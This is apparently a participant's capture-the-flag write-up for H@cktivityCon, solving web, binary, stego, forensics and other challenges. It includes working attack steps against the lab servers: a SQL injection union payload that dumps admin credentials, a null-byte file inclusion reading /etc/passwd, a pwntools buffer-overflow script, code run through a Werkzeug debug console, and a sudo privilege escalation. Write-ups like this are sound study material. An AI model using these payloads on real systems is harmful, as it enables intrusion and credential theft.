# H@cktivityCon CTF Writeups

## Web

### Ladybug

> Want to check out the new Ladybug Cartoon? It's still in production, so feel free to send in suggestions!  

This one was worth 100 points and provided six instances to connect to which were all up when I was working on this challenge.  

> http://one.jh2i.com:50018  
> http://two.jh2i.com:50018  
> http://three.jh2i.com:50018  
> http://four.jh2i.com:50018  
> http://five.jh2i.com:50018  
> http://six.jh2i.com:50018  

As I looked around the site, there were links to `http://one.jh2i.com:50018/film/home/`, `http://one.jh2i.com:50018/film/park/`, `http://one.jh2i.com:50018/film/disney/` and `http://one.jh2i.com:50018/film/beach/`. Not sure why I first thought this one would be path/directory traversal but that didn't work.  

However, I noticed that if I visit a page that doesn't exist such as `http://one.jh2i.com:50018/film/flag/`, I get an AssertionError error message from my "friendly Werkzeug powered traceback interpreter". Upon some googling, I found out I could get a python console by hovering and clicking on the terminal icon on the right. Bingo, I then listed the current working directory to find and open the flag.txt!  

```python
[console ready]
>>> import os

>>> os.listdir( )
['flag.txt', 'templates', 'main.py', 'requirements.txt']

>>> file = open("flag.txt", "r")
>>> file.read()
'flag{weurkzerg_the_worst_kind_of_debug}'
```

Flag: flag{weurkzerg_the_worst_kind_of_debug}

### Bite

> Want to learn about binary units of information? Check out the "Bite of Knowledge" website!

This one was worth also 100 points and is one provided website for us to check out.

> http://jh2i.com:50010

Upon visiting the site, we can see some pages about differnt units of data. I also noticed that the page was controlled by a get request. For instance, the bit page was at `http://jh2i.com:50010/?page=bit` and the byte page was at `http://jh2i.com:50010/?page=byte`. Could this be local file inclusion PHP vulnerability?!  

So I visited `http://jh2i.com:50010/?page=hello` and it gave me an error saying ``Sorry, `hello.php` does not exist.``.

If you visit `http://jh2i.com:50010/?page=flag.txt`, you get ``Sorry, `flag.txt.php` does not exist.`` and if you visit `http://jh2i.com:50010/?page=flag`, you learn that ``The flag is at `/flag.txt`.``

After some googleing, I learned that I can access files without the `.php` extensions on the machine by adding a `%00` (null) byte at the end and PHP interprets this as the end of the string and ignores the `.php` that is appended. We can access `/etc/passwd` by visiting `http://jh2i.com:50010/?page=/etc/passwd%00`.

With this in mind, we can read `/flag.txt` by visiting `http://jh2i.com:50010/?page=/flag.txt%00`.

Flag: flag{lfi_just_needed_a_null_byte}

### Waffle Land

> We got hacked, but our waffles are now safe after we mitigated the vulnerability.

This one was worth 150 points and there is one provided website for us to check out.

> http://jh2i.com:50024

For some reason, this one hit me very quickly, SQL injection!  

That search box just looks vulnerable and sure enough when we put a single quote in, the entire thing blows up and we get an error message...

```
Bad Request
(sqlite3.OperationalError) unrecognized token: "'"
[SQL: select * from product where name like '%'%']
(Background on this error at: http://sqlalche.me/e/13/e3q8)
```

After fiddling around a bit, I noticed that entering `'/**/union/**/select 1,name,tbl_name,sql,5/**/from sqlite_master;--` into the search box unioned the name of the tables at the bottom of the page. The users table seems interesting so I decided to view its contents using `'/**/union/**/select 1,username,password,4,5/**/from user;--`. we then get the credentials for the admin user!

```
Username: admin
Password: NT7b#ed4$J?eZ#m_
```

With this we can sign in with the button at the top right of the page and get the flag!

Flag: flag{check_your_WAF_rules}

## Binary Exploitation

### Pancakes

> How many flap-jacks are on your stack?

This was the only binary exploitation that I was able to solve during the CTF. There is an ip and port that we can use netcat to connect to as well as a binary that we can download, run and disassemble.

> nc jh2i.com 50021

Connecting to the server, it prints two lines and then waits for user input (which I later find out is a gets function) before printing more stuff to stdout.

```
bluemoon@bluemoon-Mac hacktivity % nc jh2i.com 50021
Welcome to the pancake stacker!
How many pancakes do you want?
999
Cooking your cakes.....
Smothering them in butter.....
Drowning them in syrup.....
They're ready! Our waiters are bringing them out now...
        _____________
       /    ___      \
      ||    \__\     ||
      ||      _      ||
      |\     / \     /|
      \ \___/ ^ \___/ /
      \\____/_^_\____//_
    __\\____/_^_\____// \
   /   \____/_^_\____/ \ \
  //                   , /
  \\___________   ____  /
               \_______/
```

As I alluded to earlier, this program used the `gets()` function in C which is vulnerable to buffer overflow. Here is the result of `objdump -d pancakes`.

```
00000000004007e7 main:
  4007e7: 55                           	pushq	%rbp
  4007e8: 48 89 e5                     	movq	%rsp, %rbp
  4007eb: 48 81 ec a0 00 00 00         	subq	$160, %rsp
  4007f2: 89 bd 6c ff ff ff            	movl	%edi, -148(%rbp)
  4007f8: 48 89 b5 60 ff ff ff         	movq	%rsi, -160(%rbp)
  4007ff: c7 45 f0 00 00 00 00         	movl	$0, -16(%rbp)
  400806: 48 8b 05 73 08 20 00         	movq	2099315(%rip), %rax
  40080d: b9 00 00 00 00               	movl	$0, %ecx
  400812: ba 02 00 00 00               	movl	$2, %edx
  400817: be 00 00 00 00               	movl	$0, %esi
  40081c: 48 89 c7                     	movq	%rax, %rdi
  40081f: e8 9c fe ff ff               	callq	-356 <setvbuf@plt>
  400824: 48 8b 05 75 08 20 00         	movq	2099317(%rip), %rax
  40082b: b9 00 00 00 00               	movl	$0, %ecx
  400830: ba 02 00 00 00               	movl	$2, %edx
  400835: be 00 00 00 00               	movl	$0, %esi
  40083a: 48 89 c7                     	movq	%rax, %rdi
  40083d: e8 7e fe ff ff               	callq	-386 <setvbuf@plt>
  400842: 48 8b 05 47 08 20 00         	movq	2099271(%rip), %rax
  400849: b9 00 00 00 00               	movl	$0, %ecx
  40084e: ba 02 00 00 00               	movl	$2, %edx
  400853: be 00 00 00 00               	movl	$0, %esi
  400858: 48 89 c7                     	movq	%rax, %rdi
  40085b: e8 60 fe ff ff               	callq	-416 <setvbuf@plt>
  400860: 48 8d 3d 51 03 00 00         	leaq	849(%rip), %rdi
  400867: e8 14 fe ff ff               	callq	-492 <puts@plt>
  40086c: 48 8d 3d 65 03 00 00         	leaq	869(%rip), %rdi
  400873: e8 08 fe ff ff               	callq	-504 <puts@plt>
  400878: 48 8d 85 70 ff ff ff         	leaq	-144(%rbp), %rax
  40087f: 48 89 c7                     	movq	%rax, %rdi
  400882: b8 00 00 00 00               	movl	$0, %eax
  400887: e8 24 fe ff ff               	callq	-476 <gets@plt>
  40088c: 48 8d 85 70 ff ff ff         	leaq	-144(%rbp), %rax
  400893: 48 89 c7                     	movq	%rax, %rdi
  400896: b8 00 00 00 00               	movl	$0, %eax
  40089b: e8 40 fe ff ff               	callq	-448 <atoi@plt>
  4008a0: 89 45 f0                     	movl	%eax, -16(%rbp)
  4008a3: 48 8d 3d 4d 03 00 00         	leaq	845(%rip), %rdi
  4008aa: b8 00 00 00 00               	movl	$0, %eax
  4008af: e8 ec fd ff ff               	callq	-532 <printf@plt>
  4008b4: c7 45 fc 00 00 00 00         	movl	$0, -4(%rbp)
  4008bb: eb 18                        	jmp	24 <main+0xee>
  4008bd: bf 2e 00 00 00               	movl	$46, %edi
  4008c2: e8 a9 fd ff ff               	callq	-599 <putchar@plt>
  4008c7: bf 50 c3 00 00               	movl	$50000, %edi
  4008cc: e8 1f fe ff ff               	callq	-481 <usleep@plt>
  4008d1: 83 45 fc 01                  	addl	$1, -4(%rbp)
  4008d5: 83 7d fc 04                  	cmpl	$4, -4(%rbp)
  4008d9: 7e e2                        	jle	-30 <main+0xd6>
  4008db: bf 0a 00 00 00               	movl	$10, %edi
  4008e0: e8 8b fd ff ff               	callq	-629 <putchar@plt>
  4008e5: 48 8d 3d 1e 03 00 00         	leaq	798(%rip), %rdi
  4008ec: b8 00 00 00 00               	movl	$0, %eax
  4008f1: e8 aa fd ff ff               	callq	-598 <printf@plt>
  4008f6: c7 45 f8 00 00 00 00         	movl	$0, -8(%rbp)
  4008fd: eb 18                        	jmp	24 <main+0x130>
  4008ff: bf 2e 00 00 00               	movl	$46, %edi
  400904: e8 67 fd ff ff               	callq	-665 <putchar@plt>
  400909: bf 50 c3 00 00               	movl	$50000, %edi
  40090e: e8 dd fd ff ff               	callq	-547 <usleep@plt>
  400913: 83 45 f8 01                  	addl	$1, -8(%rbp)
  400917: 83 7d f8 04                  	cmpl	$4, -8(%rbp)
  40091b: 7e e2                        	jle	-30 <main+0x118>
  40091d: bf 0a 00 00 00               	movl	$10, %edi
  400922: e8 49 fd ff ff               	callq	-695 <putchar@plt>
  400927: 48 8d 3d f6 02 00 00         	leaq	758(%rip), %rdi
  40092e: b8 00 00 00 00               	movl	$0, %eax
  400933: e8 68 fd ff ff               	callq	-664 <printf@plt>
  400938: c7 45 f4 00 00 00 00         	movl	$0, -12(%rbp)
  40093f: eb 18                        	jmp	24 <main+0x172>
  400941: bf 2e 00 00 00               	movl	$46, %edi
  400946: e8 25 fd ff ff               	callq	-731 <putchar@plt>
  40094b: bf 50 c3 00 00               	movl	$50000, %edi
  400950: e8 9b fd ff ff               	callq	-613 <usleep@plt>
  400955: 83 45 f4 01                  	addl	$1, -12(%rbp)
  400959: 83 7d f4 04                  	cmpl	$4, -12(%rbp)
  40095d: 7e e2                        	jle	-30 <main+0x15a>
  40095f: bf 0a 00 00 00               	movl	$10, %edi
  400964: e8 07 fd ff ff               	callq	-761 <putchar@plt>
  400969: 48 8d 3d d0 02 00 00         	leaq	720(%rip), %rdi
  400970: e8 0b fd ff ff               	callq	-757 <puts@plt>
  400975: 48 8b 05 f4 06 20 00         	movq	2098932(%rip), %rax
  40097c: 48 89 c7                     	movq	%rax, %rdi
  40097f: e8 fc fc ff ff               	callq	-772 <puts@plt>
  400984: b8 00 00 00 00               	movl	$0, %eax
  400989: c9                           	leave
  40098a: c3                           	retq

000000000040098b secret_recipe:
  40098b: 55                           	pushq	%rbp
  40098c: 48 89 e5                     	movq	%rsp, %rbp
  40098f: 48 81 ec a0 00 00 00         	subq	$160, %rsp
  400996: 48 c7 45 f8 00 00 00 00      	movq	$0, -8(%rbp)
  40099e: 48 8d 35 d3 02 00 00         	leaq	723(%rip), %rsi
  4009a5: 48 8d 3d ce 02 00 00         	leaq	718(%rip), %rdi
  4009ac: e8 1f fd ff ff               	callq	-737 <fopen@plt>
  4009b1: 48 89 45 f0                  	movq	%rax, -16(%rbp)
  4009b5: 48 8b 55 f0                  	movq	-16(%rbp), %rdx
  4009b9: 48 8d 85 60 ff ff ff         	leaq	-160(%rbp), %rax
  4009c0: 48 89 d1                     	movq	%rdx, %rcx
  4009c3: ba 80 00 00 00               	movl	$128, %edx
  4009c8: be 01 00 00 00               	movl	$1, %esi
  4009cd: 48 89 c7                     	movq	%rax, %rdi
  4009d0: e8 bb fc ff ff               	callq	-837 <fread@plt>
  4009d5: 48 89 45 f8                  	movq	%rax, -8(%rbp)
  4009d9: 48 8d 95 60 ff ff ff         	leaq	-160(%rbp), %rdx
  4009e0: 48 8b 45 f8                  	movq	-8(%rbp), %rax
  4009e4: 48 01 d0                     	addq	%rdx, %rax
  4009e7: c6 00 00                     	movb	$0, (%rax)
  4009ea: 48 8d 85 60 ff ff ff         	leaq	-160(%rbp), %rax
  4009f1: 48 89 c7                     	movq	%rax, %rdi
  4009f4: e8 87 fc ff ff               	callq	-889 <puts@plt>
  4009f9: 90                           	nop
  4009fa: c9                           	leave
  4009fb: c3                           	retq
  4009fc: 0f 1f 40 00                  	nopl	(%rax)
```

I noticed this function called `secret_recipe()`. Clearly this is what we want to run. To run it, all we need to do is use buffer overflow to modify the return address of main and point it to the address of the `secret_recipe()`. Although I probably could have done this more elegantly, I just put together a rough and dirty python script that adds a few bytes followed by the address of the `secret_recipe()` at `0x000000000040098b` and checked to see if the flag was printed. Here is the script I wrote:

```python
from pwn import *

i = 0

while True:
    target = remote('jh2i.com', 50021)

    payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"

    payload += "AAAA" * i

    payload += p64(0x000000000040098b)

    print payload

    target.sendline(payload)
    target.interactive()

    i += 1
```
Note: this script was made for python 2. IDK why I used python 2 sry...

But sure enough, after a few loops, we are able to run the `secret_recipe()` function and get the flag!

Flag: flag{too_many_pancakes_on_the_stack}

## Mobile

### Mobile One

> The one true mobile app.

This is also the only mobile challenge that I was able to complete. For this one, there is just a `mobile_one.apk` file that we need to download.  

The only reason I was able to solve this one is because it was very easy. All we need to do it run `strings` on the file and bingo!

```
bluemoon@bluemoon-Mac hacktivity % strings mobile_one.apk | grep flag{
##flag{strings_grep_and_more_strings}
```

Flag: flag{strings_grep_and_more_strings}

## Steganography

### Cold War

> A geopolitical activity that is pursued through economic and political actions, propaganda, acts of espionage or proxy wars and without direct military action is known as a Cold War. This type of war does not refer to conflict of seasons, but this challenge might.

For this challenge, we are provided with a single file to download: `cold_war.txt`.

```
The Cold War continues to influence world affairs. The post-Cold War world is considered to be unipolar, with the United States the sole remaining superpower.The Cold War defined the political role of the United States after World War II—by 1989 the United States had military alliances with 50 countries, with 526,000 troops stationed abroad, with 326,000 in Europe (two-thirds of which were in West Germany) and 130,000 in Asia (mainly Japan and South Korea). The Cold War also marked the zenith of peacetime military–industrial complexes, especially in the United States, and large-scale military funding of science. These complexes, though their origins may be found as early as the 19th century, snowballed considerably during the Cold War.
	     	  	      	   	     	      	     	     	    
       		    		      	  	       	       	 
	     	     	    	     	       	       	    	     	   
	   	  	       	       	 	     	   	   	      
  	   	 	      	  	   	       	  	       	       
 	    	      	   		 	 	    	    	   
      	  	  	      	     	   	 

```

After downloading this file, I notices the extra lines with many spaces. This might be because there is a secret message embeded here using stegsnow which is a whitespace steganography program. Sure enough, there is!

```
bluemoon@bluemoon-Mac hacktivity % stegsnow -C cold_war.txt
flag{do_not_use_merriam_webster}
```

Flag: flag{do_not_use_merriam_webster}

### Chess Cheater

> I didn't think he was a genius, I knew he had to be a cheat. He was always sitting down, he never got up. Batting his eyelids in the most unnatural way. Then I understood it.

Once again, for this challenge, we are provided with a single file to download: `morse.wav`. One thing to note is that the flag in this challenge is not in the normal format.

Based on this, it was fairly obvious that the audio file was some morse code. I simply googled an online morse code analyzer and found this one: `https://morsecode.world/international/decoder/audio-decoder-adaptive.html`. After uploading the file and waiting for the answer, I got the flag!

Flag: ARCANGELORICCIARDI

### Substitute Face

> :rabbit: :rabbit :rabbit:

This challenge was very interesting. You know the drill by now, we are given a file to download and this time it was `face.txt`.

Opening the file, we find many emojis!

```
👳👯👸👣👤🐡🐠👺👵👭🐠👢👪👢🐠👪👤🐡🐠👹👩👣👳👻👷👵👲👪👩👩👣👟👬👵👢👸👷👵👰👪👽
```

This one really confused me at first. I tried to see if I could piece together meaning from this but this was not goind to work. I then realized, I could convert the emoji to unicode.

```
U+D83DU+DC73 U+D83DU+DC6F U+D83DU+DC78 U+D83DU+DC63 U+D83DU+DC64 U+D83DU+DC21 U+D83DU+DC20 U+D83DU+DC7A U+D83DU+DC75 U+D83DU+DC6D U+D83DU+DC20 U+D83DU+DC62 U+D83DU+DC6A U+D83DU+DC62 U+D83DU+DC20 U+D83DU+DC6A U+D83DU+DC64 U+D83DU+DC21 U+D83DU+DC20 U+D83DU+DC79 U+D83DU+DC69 U+D83DU+DC63 U+D83DU+DC73 U+D83DU+DC7B U+D83DU+DC77 U+D83DU+DC75 U+D83DU+DC72 U+D83DU+DC6A U+D83DU+DC69 U+D83DU+DC69 U+D83DU+DC63 U+D83DU+DC5F U+D83DU+DC6C U+D83DU+DC75 U+D83DU+DC62 U+D83DU+DC78 U+D83DU+DC77 U+D83DU+DC75 U+D83DU+DC70 U+D83DU+DC6A U+D83DU+DC7D
```

Taking the last two characters from each, we get the following string of hex numbers.

```
73 6F 78 63 64 21 20 7A 75 6D 20 62 6A 62 20 6A 64 21 20 79 69 63 73 7B 77 75 72 6A 69 69 63 5F 6C 75 62 78 77 75 70 6A 7D
```

Converting the HEX to ASCII we get the following string which kinda looks like the flag.

```
soxcd! zum bjb jd! yics{wurjiic_lubxwupj}
```

After one sleepless night, a lot of coffee and a few headbanging moments, I figured out the substitution key. The decrypted string is:

```
great! you did it! flag{mozilla_codemoji}
```

Flag: flag{mozilla_codemoji}

PS: to be honest, this challenge was very guessy and I didn't really like it...

## Scripting

### Misdirection

> Check out the new Flag Finder service! We will find the flag for you!

For this challenge, we are provided a website to visit.

> http://jh2i.com:50011/

Here we can find a big blue button that says "Find The Flag". After clicking the button we are brought to `http://jh2i.com:50011/site/flag.php` which then redirects us to many sites and every other one gives us one character of the flag. I wrote a python script to get the follow the redirects to find the flag

```python
import requests

ip = "http://jh2i.com:50011"
location = "/site/flag.php"

for i in range (98):
    r = requests.get(ip + location, allow_redirects=False)

    if (r.text != '' and r.text != ' '):
        print(r.text)

    location = r.headers['Location']
```

After running this script, we get all the characters in this flag!

Flag: flag{http_302_point_you_in_the_right_redirection}

## Miscellaneous

### Pseudo

> Someone here has special powers... but who? And how!?

This was a very interesting challenge. We are given credentials to connect to a Linux machine where we will be looking for the flag.

> ssh -p 50014 user@jh2i.com # password is 'userpass'

After logging in, we have what seems to be an Ubuntu Docker Container.

```
user@8222ed017436:~$ pwd
/home/user
user@8222ed017436:~$ whoami
user
user@8222ed017436:~$ ls -l
total 0
```

From the hint in the description, I guessed that we need to find the credentials to someone's account. After poking around the system and a lot of trial and error, we can find some credentials in a README file at `/etc/sudoers.d/README`.

```
user@8222ed017436:~$ cd /etc/sudoers.d
user@8222ed017436:/etc/sudoers.d$ ls -l
total 4
-rw-r--r-- 1 root root 1072 Jul 25 01:57 README
user@8222ed017436:/etc/sudoers.d$ cat README 
#
# As of Debian version 1.7.2p1-1, the default /etc/sudoers file created on
# installation of the package now includes the directive:
#
#       #includedir /etc/sudoers.d
#
# This will cause sudo to read and parse any files in the /etc/sudoers.d
# directory that do not end in '~' or contain a '.' character.
#
# Note that there must be at least one file in the sudoers.d directory (this
# one will do), and all files in this directory should be mode 0440.
#
# Note also, that because sudoers contents can vary widely, no attempt is
# made to add this directive to existing sudoers files on upgrade.  Feel free
# to add the above directive to the end of your /etc/sudoers file to enable
# this functionality for existing installations if you wish!
#
# Finally, please note that using the visudo command is the recommended way
# to update sudoers content, since it protects against many failure modes.
# See the man page for visudo for more information.
#
#
# The credentials for the 'todd' account is 'needle_in_a_haystack'
todd ALL = NOPASSWD: ALL
```
```
Username: todd
Password: needle_in_a_haystack
```

With these credentials, we can switch to the todd user who has sudo permissions!

```
user@8222ed017436:/etc/sudoers.d$ su todd
Password: 
todd@8222ed017436:/etc/sudoers.d$ whoami
todd
```

With sudo permissions, we can then login as root and get to the flag at `/root/flag.txt`.

```
todd@8222ed017436:/etc/sudoers.d$ sudo su
root@8222ed017436:/etc/sudoers.d# cd /root
root@8222ed017436:~# ls -l
total 4
-rw-r--r-- 1 root root 42 Jul 25 01:57 flag.txt
root@8222ed017436:~# cat flag.txt
flag{hmmm_that_could_be_a_sneaky_backdoor}
```

Flag: flag{hmmm_that_could_be_a_sneaky_backdoor}

### Cat Cage

> We are in the cat cage! Only the good cats get treats!

For this challenge we are given an IP address and port we can use netcat to connect to.

> nc jh2i.com 50000

After connecting, we seem to be provided with a Linux shell and there is a `get_flag` shell script in the current working directory.

```
mshen@mshen-Mac hacktivity % nc jh2i.com 50000
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
bash: groups: command not found
bash: lesspipe: command not found
bash: dircolors: command not found
user@cat_cage:/home/user$ ls -l
ls -l
total 4
-rwxr-xr-x 1 user user 177 Jul 25 01:57 get_flag
```

First, I tried to run the shell script but it justs echos some text.

```
user@cat_cage:/home/user$ ./get_flag
./get_flag
Oh I am sorry, only cats can get the flag!
```

I tried to cat out the file to see the shell script and here it is:

```sh
#!/bin/sh

echo "Oh I am sorry, only cats can get the flag!"
exit 0
```

However, if you run `cat -A get_flag`, you find some more hidden messages including the flag!

```
user@cat_cage:/home/user$ cat -A get_flag
#!/bin/sh$
$
echo "Oh I am sorry, only cats can get the flag!"$
exit 0$
^[[2Aecho "flag{thats_a_good_trick_heres_some_catnip}"$
^[[1Aecho "Oh I am sorry, only cats can get the flag!"$
$
```

Flag: flag{thats_a_good_trick_heres_some_catnip}

## Forensics

### Opposable Thumbs

> The flag is right between your finger tips.

For this challenge, we are given the file: `thumbcache_256.db`.  

At first, I tried to open it up in Microsoft Access but it didn't seem to work. Since I'm not familiar with working with `.db` files, I decided to do some googling.  

I learned that this file codntains the thumbnails that the Windows File Explorer uses to render the previews. So, I booted up my Win10 VM and downloaded this `thumbcache_viewer.exe` from `https://thumbcacheviewer.github.io/` and with this application, I was able to open the `thumbcache_256.db` file and I found that `3fa8aafdd63e1168.jpg` contained the flag!

Flag: flag{human_after_all}

Note: there are probably much better ways to do this challenge. This is just the one that I was able to find and it worked :)

## OSINT

### World Hotspots

> What can you tell me about 9C:EF:D5:FB:9F:F0?

This challenge just had a prompt. There was no server to connect to and no files to download.  

I decided to search for the MAC address provided on `https://www.wigle.net/`.  It highlighted a point near I St NE and 6th St NE in Washington, District of Columbia, United States approximately 38.9008N and 76.998W. Zooming in, we can find the flag!

Flag: flag{network_osint}